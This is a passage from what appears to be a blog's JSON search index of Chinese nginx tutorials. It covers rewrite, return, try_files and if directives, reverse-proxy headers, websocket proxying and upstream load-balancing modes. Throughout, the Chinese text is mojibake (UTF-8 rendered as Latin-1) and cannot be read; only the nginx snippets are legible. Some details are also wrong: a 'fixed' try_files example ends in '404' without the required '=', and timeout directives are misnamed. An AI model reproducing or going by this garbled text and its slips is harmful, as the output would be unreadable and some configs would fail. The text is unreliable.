æ‰€ä»¥è®¿é—®`/some-dir/`æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨å»è¯¥ç›®å½•ä¸‹æ‰¾å¯¹åº”çš„é»˜è®¤æ–‡ä»¶ã€‚\n  \n  å¦‚æœè®¿é—®`/some-dir`çš„è¯ï¼ŒæœåŠ¡å™¨ä¼šå…ˆå»æ‰¾`some-dir`æ–‡ä»¶ï¼Œæ‰¾ä¸åˆ°çš„è¯ä¼šå°†`some-dir`å½“æˆç›®å½•ï¼Œé‡å®šå‘åˆ°`/some-dir/`ï¼Œå»è¯¥ç›®å½•ä¸‹æ‰¾é»˜è®¤æ–‡ä»¶ã€‚\n\n\n\n# 2. rewirteè§„åˆ™\n\n\n### 2.1 returnæŒ‡ä»¤\n\nreturnæŒ‡ä»¤å†™åœ¨serverå’Œlocationé‡Œé¢\n\n```nginx\nreturn code [text];\nreturn code URL;\nreturn URL;\n```\n\næˆ‘ä»¬æ¥çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­\n\n```nginx\n return 301 $scheme://www.baidu.com$request_uri; \n```\n\nreturn æŒ‡ä»¤å‘Šè¯‰ nginx åœæ­¢å¤„ç†è¯·æ±‚, ç›´æ¥è¿”å›301ä»£ç å’ŒæŒ‡å®š\bé‡å†™è¿‡çš„URLåˆ°å®¢æˆ·ç«¯. $schemeæ˜¯æŒ‡\båè®®(http),$request_uriæŒ‡\båŒ…å«å‚æ•°çš„å®Œæ•´URI \n\n\n\nå¯¹äº 3xx ç³»åˆ—å“åº”ç , urlå‚æ•°å°±æ˜¯é‡å†™çš„url\n\n```nginx\nreturn (301 | 302 | 303 | 307) url;\n```\n\nå¯¹äºå…¶ä»–å“åº”å—, å¯ä»¥å‡ºç°ä¸€ä¸ªå­—ç¬¦ä¸²\n\n```nginx\nreturn (1xx | 2xx | 4xx | 5xx)[\"text\"]\n```\n\nä¾‹å¦‚:\n\n```nginx\nreturn 401 \"Access denied because token is expired or invalid\";\n```\n\n\n\n### 2.2 rewriteæŒ‡ä»¤\n\nrewriteæŒ‡ä»¤å†™åœ¨serverå’Œlocationé‡Œé¢, è§„åˆ™ä¼šæ”¹å˜éƒ¨åˆ†æˆ–æ•´ä¸ªç”¨æˆ·çš„URL.\n\n```nginx\nrewrite regex URL [flag]\n```\n\n1. regex æ­£åˆ™è¡¨è¾¾å¼\n\n2. flag\n\n   + last\n\n     åœæ­¢å½“å‰è¿™ä¸ªè¯·æ±‚ï¼Œå¹¶æ ¹æ®rewriteåŒ¹é…çš„è§„åˆ™é‡æ–°å‘èµ·ä¸€ä¸ªè¯·æ±‚ã€‚æ–°è¯·æ±‚åˆä»ç¬¬ä¸€é˜¶æ®µå¼€å§‹æ‰§è¡Œ, æ‰¾å¯»æ–°çš„location\n\n   + break\n\n     breakå¹¶ä¸ä¼šé‡æ–°å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œåªæ˜¯è·³è¿‡å½“å‰çš„rewriteé˜¶æ®µï¼Œå¹¶æ‰§è¡Œæœ¬è¯·æ±‚åç»­çš„æ‰§è¡Œé˜¶æ®µ, åœ¨åŒä¸€ä¸ªlocationé‡Œå¤„ç†\n\n   + redirect\n\n     è¿”å›åŒ…å«302çš„ä¸´æ—¶é‡å®šå‘\n\n   + permanent\n\n     è¿”å›åŒ…å«301çš„æ°¸ä¹…é‡å®šå‘\n\n3. rewriteåªèƒ½è¿”å›301æˆ–302, å¦‚æœæœ‰å…¶ä»–,éœ€è¦åé¢åŠ ä¸Šreturn, ä¾‹å¦‚:\n\n```nginx\nrewrite ^(/download/.*)/media/(\\w+)\\.?.*$ $1/mp3/$2.mp3 last;\nrewrite ^(/download/.*)/audio/(\\w+)\\.?.*$ $1/mp3/$2.ra  last;\nreturn  403;\n```\n\n+ åŒ¹é…/downloadå¼€å¤´çš„URL,  ç„¶åæ›¿æ¢ç›¸å…³è·¯å¾„\n+ `/download/cdn-west/media/file1` -> `/download/cdn-west/mp3/file1.mp3`\n\n+ å¦‚æœåŒ¹é…ä¸ä¸Š, å°†è¿”å›å®¢æˆ·ç«¯403\n\n\n\n### 2.3 try_filesæŒ‡ä»¤\n\ntry_filesæŒ‡ä»¤å†™åœ¨serverå’Œlocationé‡Œé¢.\n\n```nginx\ntry_files file ... uri æˆ– try_files file ... = code\n```\n\ntry_files æŒ‡ä»¤çš„å‚æ•°æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„åˆ—è¡¨, ä»¥åŠåé¢çš„uriå‚æ•°. nginxä¼šæŒ‰ç…§é¡ºåºæ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨, å¹¶ç”¨æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶æä¾›æœåŠ¡. å¦‚æœéƒ½ä¸å­˜åœ¨, å†…éƒ¨é‡å®šå‘åˆ°æœ€åçš„è¿™ä¸ªuri\n\nä¾‹å¦‚:\n\n```nginx\nlocation /images/ {\n    try_files $uri $uri/ /images/default.gif;\n}\n\nlocation = /images/default.gif {\n    expires 30s;\n}\n```\n\ntry_fileså¸¸ç”¨çš„å˜é‡:\n\n+ $uri è¡¨ç¤ºåŸŸåä»¥åçš„éƒ¨åˆ†\n\n+ $args  è¯·æ±‚urlä¸­ ? åé¢çš„å‚æ•° (ä¸åŒ…æ‹¬?æœ¬èº«)\n\n+ $is_args  åˆ¤æ–­$argsæ˜¯å¦ä¸ºç©º\n\n  ```nginx\n  try_files $uri $uri/ /index.php$is_args$args; #è¿™æ ·å°±èƒ½é¿å…å¤šä½™çš„?å·\n  ```\n  \n+ $query_string å’Œ $argsç›¸åŒ\n\n+ $document_root rootæŒ‡ä»¤æŒ‡å®šçš„å€¼\n\n+ $request_filename è¯·æ±‚çš„æ–‡ä»¶è·¯å¾„\n\n+ $request_uri åŸå§‹è¯·æ±‚uri  \n\n\n\næˆ‘ä»¬çœ‹ä¸ªä¾‹å­:\n\n```nginx\ntry_files /app/cache/ $uri @fallback; \nindex index.php index.html;\n```\n\nå®ƒå°†æ£€æµ‹$document_root/app/cache/index.php,$document_root/app/cache/index.html å’Œ $document_root$uriæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ç€å†…éƒ¨é‡å®šå‘åˆ°@fallback(ï¼ è¡¨ç¤ºé…ç½®æ–‡ä»¶ä¸­é¢„å®šä¹‰æ ‡è®°ç‚¹) ã€‚\n\nä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶æˆ–è€…çŠ¶æ€ç (=404)ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œå¦‚æœæ˜¯æœ€åä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å¿…é¡»å­˜åœ¨ã€‚\n\n\n\næˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªé”™è¯¯:\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri;\n}\n```\n\nåŸæ„å›¾æ˜¯è®¿é—®`http://example.com/test.jpg`æ—¶å…ˆå»æ£€æŸ¥`/web/wwwroot/static/test.jpg`æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±å–`/web/wwwroot/test.jpg`\n\nä½†ç”±äºæœ€åä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå†…éƒ¨é‡å®šå‘ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šæ£€æŸ¥`/web/wwwroot/test.jpg`æ˜¯å¦å­˜åœ¨ï¼Œåªè¦ç¬¬ä¸€ä¸ªè·¯å¾„ä¸å­˜åœ¨å°±ä¼šé‡æ–°å‘ç„¶åå†è¿›å…¥è¿™ä¸ªlocationé€ æˆæ­»å¾ªç¯ã€‚ç»“æœå‡ºç°500 Internal Server Error\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri 404;\n}\n```\n\nè¿™æ ·æ‰ä¼šå…ˆæ£€æŸ¥`/web/wwwroot/static/test.jpg`æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±å–`/web/wwwroot/test.jpg`å†ä¸å­˜åœ¨åˆ™è¿”å›404 not found\n\n\n\n### 2.4 ifæŒ‡ä»¤\n\nifä¸æ˜¯ç³»ç»Ÿçº§çš„æŒ‡ä»¤, æ˜¯å’Œrewriteé…åˆçš„. if å¿…é¡»å†™åœ¨serverå’Œlocationé‡Œé¢.\n\n- å˜é‡å:   å¦‚æœæ˜¯ç©ºå­—ç¬¦ä¸²æˆ–\"0\"ä¸ºFALSE\n- = åˆ¤æ–­ç›¸ç­‰, != åˆ¤æ–­ä¸ç›¸ç­‰\n- ~ å’Œ ~*(ä¸åˆ†åŒºå¤§å°å†™) å°†å˜é‡ä¸æ­£åˆ™åŒ¹é…, æ•è·å¯ä»¥ç”¨ $1 åˆ° $9\n- !~ å’Œ !~* ç”¨ä½œä¸åŒ¹é…è¿ç®—ç¬¦\n- æ­£åˆ™å«æœ‰ } æˆ– ; å­—ç¬¦éœ€è¦ç”¨å¼•å·æ‹¬èµ·æ¥\n- å¸¸ç”¨åˆ¤æ–­æŒ‡ä»¤\n  - -f å’Œ !-f åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶(file)\n  - -d å’Œ !-d åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›®å½•(directory)\n  - -e å’Œ !-e åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶æˆ–ç›®å½•(exists)\n  - -x å’Œ !-x åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ(execute)\n\n\n\nä¾‹å¦‚ä¸‹é¢çš„åˆ—å­:\n\n```nginx\nif ($http_user_agent ~ Chrome) {\n    rewrite ^([^/]*)$ /chrome$1 break;\n}\n\nif ($request_method = POST){\n    return 405;\n}\n\nif (-f $request_filename) {\n    expires max;\n    break;\n}\n```\n\n\n\n# 3. proxy_passæ¨¡å—\n\nproxy_passæŒ‡ä»¤æ˜¯å°†è¯·æ±‚åå‘ä»£ç†åˆ°URLå‚æ•°æŒ‡å®šçš„æœåŠ¡å™¨ä¸Šï¼ŒURLå¯ä»¥æ˜¯ä¸»æœºåæˆ–è€…IPåœ°å€+ç«¯å£å·çš„å½¢å¼ï¼Œä¾‹å¦‚ï¼š\n\n```\nproxy_pass http://proxy_server;\nproxy_pass http://192.168.9.2:8000;\n```\n\n### 3.1 åŸºæœ¬é…ç½®\n\n+ proxy_set_headerï¼šè®¾ç½®æœåŠ¡å™¨è·å–ç”¨æˆ·çš„ä¸»æœºåæˆ–è€…çœŸå®ipåœ°å€ï¼Œä»¥åŠä»£ç†è€…çš„çœŸå®ipåœ°å€ã€‚ \n+ client_body_buffer_sizeï¼šç”¨äºæŒ‡å®šå®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“ç¼“å†²åŒºå¤§å°ï¼Œå¯ä»¥ç†è§£ä¸ºå…ˆä¿å­˜åˆ°æœ¬åœ°å†ä¼ ç»™ç”¨æˆ· \n+ proxy_connect_timeoutï¼šè¡¨ç¤ºè¿æ¥æœåŠ¡å™¨çš„è¶…æ—¶æ—¶é—´ï¼Œå³å‘èµ·tcpæ¡æ‰‹ç­‰å€™å“åº”çš„è¶…æ—¶æ—¶é—´ \n+ proxy_send_timeï¼šæœåŠ¡å™¨çš„æ•°æ®ä¼ å›æ—¶é—´ï¼Œåœ¨è§„å®šæ—¶é—´å†…æœåŠ¡å™¨å¿…é¡»ä¼ å›å®Œæ‰€æœ‰æ•°æ®ï¼Œå¦åˆ™ï¼Œnginxå°†æ–­å¼€è¿™ä¸ªè¿æ¥ \n+ proxy_read_timeï¼šè®¾ç½®nginxä»ä»£ç†çš„åç«¯æœåŠ¡å™¨è·å–æ•°æ®çš„æ—¶é—´ï¼Œè¡¨ç¤ºè¿æ¥å»ºç«‹æˆåŠŸåï¼Œ+ nginxç­‰å¾…æœåŠ¡å™¨çš„å“åº”æ—¶é—´ï¼Œå…¶å®æ˜¯nginxå·²ç»è¿›å…¥æœåŠ¡å™¨çš„æ’é˜Ÿä¸­ç­‰å€™å¤„ç†çš„æ—¶é—´ã€‚ \n+ proxy_buffer_sizeï¼šè®¾ç½®ç¼“å†²åŒºå¤§å°ï¼Œé»˜è®¤è¯¥ç¼“å†²åŒºå¤§å°ç­‰äºproxy_buffersè®¾ç½®çš„å¤§å° \n+ proxy_buffersï¼šè®¾ç½®ç¼“å†²åŒºçš„æ•°é‡å’Œå¤§å°ï¼Œnginxä»ä»£ç†çš„æœåŠ¡å™¨è·å–å“åº”æ•°æ®ä¼šæ”¾ç½®åˆ°ç¼“å†²åŒº \n+ proxy_busy_buffers_sizeï¼šç”¨äºè®¾ç½®ç³»ç»Ÿå¾ˆå¿™æ—¶å¯ä»¥ä½¿ç”¨çš„proxy_bufferså¤§å°ï¼Œå®˜æ–¹æ¨èå¤§å°ä¸ºproxy_buffers*2 \n+ proxy_temp_file_write_sizeï¼šæŒ‡å®šproxyç¼“å­˜ä¸´æ—¶æ–‡ä»¶çš„å¤§å°\n\n\n\n### 3.2 proxy_set_header\n\n```bash\nè¯­æ³•:    proxy_set_header field value;\né»˜è®¤å€¼:    \nproxy_set_header Host $proxy_host; # æ³¨æ„è¿™ä¸ªæ˜¯proxy_host\nproxy_set_header Connection close;\n\n\nä¸Šä¸‹æ–‡:    http, server, location\n```\n\nå…è®¸é‡æ–°å®šä¹‰æˆ–è€…æ·»åŠ å‘å¾€åç«¯æœåŠ¡å™¨çš„è¯·æ±‚å¤´ã€‚valueå¯ä»¥åŒ…å«æ–‡æœ¬ã€å˜é‡æˆ–è€…å®ƒä»¬çš„ç»„åˆã€‚ å½“ä¸”ä»…å½“å½“å‰é…ç½®çº§åˆ«ä¸­æ²¡æœ‰å®šä¹‰proxy_set_headeræŒ‡ä»¤æ—¶ï¼Œä¼šä»ä¸Šé¢çš„çº§åˆ«ç»§æ‰¿é…ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸¤ä¸ªè¯·æ±‚å¤´ä¼šè¢«é‡æ–°å®šä¹‰ï¼š\n\n```nginx\nproxy_set_header Host       $proxy_host;\nproxy_set_header Connection close;\n```\n\nproxy_set_headerä¹Ÿå¯ä»¥è‡ªå®šä¹‰å‚æ•°ï¼Œå¦‚ï¼šproxy_set_header test paroxy_test;\n\n\n\n### 3.3 è·å–çœŸå®ip\n\n> ç»è¿‡åå‘ä»£ç†åï¼Œç”±äºåœ¨å®¢æˆ·ç«¯å’ŒwebæœåŠ¡å™¨ä¹‹é—´å¢åŠ äº†ä¸­é—´å±‚ï¼Œå› æ­¤webæœåŠ¡å™¨æ— æ³•ç›´æ¥æ‹¿åˆ°å®¢æˆ·ç«¯çš„ip, é€šè¿‡$remote_addrå˜é‡æ‹¿åˆ°çš„å°†æ˜¯åå‘ä»£ç†æœåŠ¡å™¨çš„ipåœ°å€. å¦‚æœæˆ‘ä»¬æƒ³è¦åœ¨webç«¯è·å¾—ç”¨æˆ·çš„çœŸå®ipï¼Œå°±å¿…é¡»åœ¨nginxè¿™é‡Œä½œä¸€ä¸ªèµ‹å€¼æ“ä½œï¼Œå¦‚ä¸‹ï¼š\n\n```nginx\nproxy_set_header            X-real-ip $remote_addr;\n```\n\nå…¶ä¸­è¿™ä¸ªX-real-ipæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡åï¼Œåå­—å¯ä»¥éšæ„å–ï¼Œè¿™æ ·åšå®Œä¹‹åï¼Œç”¨æˆ·çš„çœŸå®ipå°±è¢«æ”¾åœ¨X-real-ipè¿™ä¸ªå˜é‡é‡Œäº†ï¼Œç„¶åï¼Œåœ¨webç«¯å¯ä»¥è¿™æ ·è·å–ï¼šrequest.getAttribute(\"X-real-ip\")\n\n\n\n### 3.4 å¸¸è§é…ç½®è§£é‡Š\n\n```\nserver {\n        server_name liuwei.fhyx.com;\n\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_redirect         off;\n        proxy_http_version     1.1;\n        proxy_set_header       Upgrade $http_upgrade;\n        proxy_set_header       Connection \"upgrade\";\n        proxy_buffering        off;\n\n        location / {\n                proxy_pass     http://127.0.0.1:8000;\n        }\n\n        location ~ \"/(box|c|bub)/\" {\n                proxy_pass     http://127.0.0.1:8081;\n        }\n\n        location ~ /(a|o2)/ {\n                proxy_pass     http://127.0.0.1:3010;\n        }\n\n        location ~ \"/api/(v\\d{1,2})/\" {\n                proxy_pass     http://127.0.0.1:5010;\n        }\n\n}\n```\n\n+ proxy_set_header   X-real-ip $remote_addr;\n\n  å¯ä»¥åœ¨webæœåŠ¡å™¨ç«¯è·å¾—ç”¨æˆ·çš„çœŸå®ip, ä½†æ˜¯ï¼Œå®é™…ä¸Šè¦è·å¾—ç”¨æˆ·çš„çœŸå®ipï¼Œä¸æ˜¯åªæœ‰è¿™ä¸€ä¸ªæ–¹æ³•ã€‚\n\n+ proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n\n  X-Forwarded-For è¯·æ±‚å¤´æ ¼å¼éå¸¸ç®€å•ï¼Œå°±è¿™æ ·ï¼š\n\n  ```bash\n  X-Forwarded-For: client, proxy1, proxy2\n  ```\n  \n  å¯ä»¥çœ‹åˆ°ï¼ŒXFF çš„å†…å®¹ç”±ã€Œè‹±æ–‡é€—å· + ç©ºæ ¼ã€éš”å¼€çš„å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼Œæœ€å¼€å§‹çš„æ˜¯ç¦»æœåŠ¡ç«¯æœ€è¿œçš„è®¾å¤‡ IPï¼Œç„¶åæ˜¯æ¯ä¸€çº§ä»£ç†è®¾å¤‡çš„ IPã€‚\n  \n   å¦‚æœä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ä¹‹å‰ï¼Œç»è¿‡äº†ä¸‰ä¸ªä»£ç† Proxy1ã€Proxy2ã€Proxy3ï¼ŒIP åˆ†åˆ«ä¸º IP1ã€IP2ã€IP3ï¼Œç”¨æˆ·çœŸå® IP ä¸º IP0ï¼Œé‚£ä¹ˆæŒ‰ç…§ XFF æ ‡å‡†ï¼ŒæœåŠ¡ç«¯æœ€ç»ˆä¼šæ”¶åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š\n\n    ```bash\n  X-Forwarded-For: IP0, IP1, IP2\n    ```\n\n+ proxy_set_header       Host $http_host;\n\n  $hostï¼šè¯·æ±‚ä¸­çš„ä¸»æœºå¤´(HOST)å­—æ®µï¼Œå¦‚æœè¯·æ±‚ä¸­çš„ä¸»æœºå¤´ä¸å¯ç”¨æˆ–è€…ç©ºï¼Œåˆ™ä¸ºå¤„ç†è¯·æ±‚çš„serveråç§°(å¤„ç†è¯·æ±‚çš„serverçš„server_nameæŒ‡ä»¤çš„å€¼)ã€‚å€¼ä¸ºå°å†™ï¼Œä¸åŒ…å«ç«¯å£!!!!\n\n  å¦‚æœå®¢æˆ·ç«¯å‘è¿‡æ¥çš„è¯·æ±‚çš„headerä¸­æœ‰â€™HOSTâ€™è¿™ä¸ªå­—æ®µæ—¶ï¼Œ`$http_host`å’Œ`$host`éƒ½æ˜¯åŸå§‹çš„â€™HOSTâ€™å­—æ®µ\n\n  æ¯”å¦‚è¯·æ±‚çš„æ—¶å€™HOSTçš„å€¼æ˜¯www.csdn.net é‚£ä¹ˆåä»£åè¿˜æ˜¯www.csdn.net\n\n  å¦‚æœå®¢æˆ·ç«¯å‘è¿‡æ¥çš„è¯·æ±‚çš„headerä¸­æ²¡æœ‰æœ‰â€™HOSTâ€™è¿™ä¸ªå­—æ®µæ—¶ï¼Œ å»ºè®®ä½¿ç”¨$hostï¼Œè¿™è¡¨ç¤ºè¯·æ±‚ä¸­çš„server nameã€‚\n\n\n\n\n# 4. websocketåå‘ä»£ç†\n\n+ nginx é¦–å…ˆç¡®è®¤ç‰ˆæœ¬å¿…é¡»æ˜¯1.3ä»¥ä¸Šã€‚\n\n+ mapæŒ‡ä»¤çš„ä½œç”¨ï¼š è¯¥ä½œç”¨ä¸»è¦æ˜¯æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚ä¸­$http_upgradeçš„å€¼ï¼Œæ¥æ„é€ æ”¹å˜$connection_upgradeçš„å€¼ï¼Œå³æ ¹æ®å˜é‡$http_upgradeçš„å€¼åˆ›å»ºæ–°çš„å˜é‡$connection_upgradeï¼Œ åˆ›å»ºçš„è§„åˆ™å°±æ˜¯{}é‡Œé¢çš„ä¸œè¥¿ã€‚å…¶ä¸­çš„è§„åˆ™æ²¡æœ‰åšåŒ¹é…ï¼Œå› æ­¤ä½¿ç”¨é»˜è®¤çš„ï¼Œå³ $connection_upgradeçš„å€¼ä¼šä¸€ç›´æ˜¯ upgradeã€‚ç„¶åå¦‚æœ $http_upgradeä¸ºç©ºå­—ç¬¦ä¸²çš„è¯ï¼Œ é‚£å€¼ä¼šæ˜¯ closeã€‚\n\n```nginx\n#å¿…é¡»æ·»åŠ çš„\nmap $http_upgrade $connection_upgrade {\n        default upgrade;\n        '' close;\n}\n\nupstream websocket {\n    ip_hash;\n    #è½¬å‘åˆ°æœåŠ¡å™¨ä¸Šç›¸åº”çš„wsç«¯å£\n    server localhost:3344;\n    server localhost:8011;\n}\nserver {\n    listen 80;\n    server_name a.liuvv.com;\n    location / {\n    \n        #è½¬å‘åˆ°http://websocket\n        proxy_pass http://websocket;\n        proxy_read_timeout 300s;\n        proxy_send_timeout 300s;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    \n        #å‡çº§http1.1åˆ° websocketåè®®  \n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection  $connection_upgrade;\n    }\n}\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://nginx.org/en/docs/\n+ [Nginxé…ç½®locationã€ifä»¥åŠreturnã€rewriteå’Œ try_files æŒ‡ä»¤](https://www.xiebruce.top/710.html)\n+ [Nginx åŸºæœ¬åŠŸèƒ½ - å°† Nginx é…ç½®ä¸º Web æœåŠ¡å™¨](https://blog.csdn.net/kikajack/article/details/79322194)\n+ [Nginx çš„ try_files æŒ‡ä»¤ä½¿ç”¨å®ä¾‹](https://www.hi-linux.com/posts/53878.html)\n+ [HTTP è¯·æ±‚å¤´ä¸­çš„ X-Forwarded-For](https://imququ.com/post/x-forwarded-for-header-in-http.html)","tags":["nginx"],"categories":["nginx"]},{"title":"nginxé€šè¿‡upstreamå®ç°è´Ÿè½½å‡è¡¡","url":"%2Fp%2F4c38afcc.html","content":"\n### 1. nginx upstream è´Ÿè½½å‡è¡¡\n\nupstream æ¨¡å—è´Ÿå€ºè´Ÿè½½å‡è¡¡æ¨¡å—ï¼Œå¦‚æœNginxæ²¡æœ‰ä»…ä»…åªèƒ½ä»£ç†ä¸€å°æœåŠ¡å™¨çš„è¯ï¼Œé‚£å®ƒä¹Ÿä¸å¯èƒ½åƒä»Šå¤©è¿™ä¹ˆç«ï¼ŒNginxå¯ä»¥é…ç½®ä»£ç†å¤šå°æœåŠ¡å™¨ï¼Œå½“ä¸€å°æœåŠ¡å™¨å®•æœºä¹‹åï¼Œä»èƒ½ä¿æŒç³»ç»Ÿå¯ç”¨ã€‚å…·ä½“é…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n åœ¨httpèŠ‚ç‚¹ä¸‹ï¼Œæ·»åŠ upstreamèŠ‚ç‚¹ã€‚\n\n```nginx\nupstream levonfly { \n      server 10.0.6.108:7080; \n      server 10.0.0.85:8980; \n}\n```\n\nå°†serverèŠ‚ç‚¹ä¸‹çš„locationèŠ‚ç‚¹ä¸­çš„proxy_passé…ç½®ä¸ºï¼šhttp:// + upstreamåç§°ï¼Œå³\"http://levonfly\".\n\n```nginx\nlocation / { \n            root  html; \n            index  index.html index.htm; \n            proxy_pass http://levonfly; \n}\n```\n\nç°åœ¨è´Ÿè½½å‡è¡¡åˆæ­¥å®Œæˆäº†ã€‚upstreamæŒ‰ç…§è½®è¯¢ï¼ˆé»˜è®¤ï¼‰æ–¹å¼è¿›è¡Œè´Ÿè½½ï¼Œæ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æœåŠ¡å™¨downæ‰ï¼Œèƒ½è‡ªåŠ¨å‰”é™¤ã€‚è™½ç„¶è¿™ç§æ–¹å¼ç®€ä¾¿ã€æˆæœ¬ä½å»‰ã€‚\n<!-- more -->\n\n\n### 2. upstream è´Ÿè½½å‡è¡¡çš„æ¨¡å¼\n\nnginxçš„upstreamæ”¯æŒ5ç§åˆ†é…æ–¹å¼ï¼Œä¸‹é¢å°†ä¼šè¯¦ç»†ä»‹ç»ï¼Œå…¶ä¸­ï¼Œå‰ä¸‰ç§ä¸ºNginxåŸç”Ÿæ”¯æŒçš„åˆ†é…æ–¹å¼ï¼Œåä¸¤ç§ä¸ºç¬¬ä¸‰æ–¹æ”¯æŒçš„åˆ†é…æ–¹å¼ï¼š\n\n##### 2.1 è½®è¯¢(é»˜è®¤)\n\nè½®è¯¢æ˜¯upstreamçš„é»˜è®¤åˆ†é…æ–¹å¼ï¼Œå³æ¯ä¸ªè¯·æ±‚æŒ‰ç…§æ—¶é—´é¡ºåºè½®æµåˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœæŸä¸ªåç«¯æœåŠ¡å™¨downæ‰åï¼Œèƒ½è‡ªåŠ¨å‰”é™¤ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101:8888;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:8888;\n}\n```\n\n##### 2.2 weight        \n\nè½®è¯¢çš„åŠ å¼ºç‰ˆï¼Œå³å¯ä»¥æŒ‡å®šè½®è¯¢æ¯”ç‡ï¼Œweightå’Œè®¿é—®å‡ ç‡æˆæ­£æ¯”ï¼Œä¸»è¦åº”ç”¨äºåç«¯æœåŠ¡å™¨å¼‚è´¨çš„åœºæ™¯ä¸‹ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101 weight=1;\n  server 192.168.1.102 weight=2;\n  server 192.168.1.103 weight=3; # æ˜¯101è®¿é—®ç‡çš„3å€\n}\n```\n\n##### 2.3 ip_hash        \n\næ¯ä¸ªè¯·æ±‚æŒ‰ç…§è®¿é—®ipï¼ˆå³nginxçš„å‰ç½®æœåŠ¡å™¨æˆ–è€…å®¢æˆ·ç«¯IPï¼‰çš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¯ä¸ªè®¿å®¢ä¼šå›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessionä¸€è‡´é—®é¢˜ã€‚\n\n```nginx\nupstream backend {\n  ip_hash;\n  server 192.168.1.101:7777;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:9999;\n}\n```\n\n##### 2.4 fair(ç¬¬ä¸‰æ–¹) \n\nfairé¡¾åæ€ä¹‰ï¼Œå…¬å¹³åœ°æŒ‰ç…§åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´ï¼ˆrtï¼‰æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­å³rtå°çš„åç«¯æœåŠ¡å™¨ä¼˜å…ˆåˆ†é…è¯·æ±‚ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  fair;\n}\n```\n\n##### 2.5 url_hash(ç¬¬ä¸‰æ–¹)\n\nä¸ip_hashç±»ä¼¼ï¼Œä½†æ˜¯æŒ‰ç…§è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿å¾—æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œä¸»è¦åº”ç”¨äºåç«¯æœåŠ¡å™¨ä¸ºç¼“å­˜æ—¶çš„åœºæ™¯ä¸‹ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  hash $request_uri;\n  hash_method crc32;\n}\n```\n\næ³¨æ„ï¼šåœ¨upstreamä¸­åŠ å…¥hashè¯­å¥ï¼Œserverè¯­å¥ä¸­ä¸èƒ½å†™å…¥weightç­‰å…¶ä»–çš„å‚æ•°ï¼Œhash_methodæ˜¯ä½¿ç”¨çš„hashç®—æ³•ã€‚\n\n\n\n### 3. upstream å…¶ä»–å‚æ•°\n\nupstreamä¸­serveræŒ‡ä»¤è¯­æ³•å¦‚ä¸‹ï¼š`server address [parameters]` ,  å…³é”®å­—serverå¿…é€‰, addressä¹Ÿå¿…é€‰ï¼Œå¯ä»¥æ˜¯ä¸»æœºåã€åŸŸåã€ipæˆ–unix 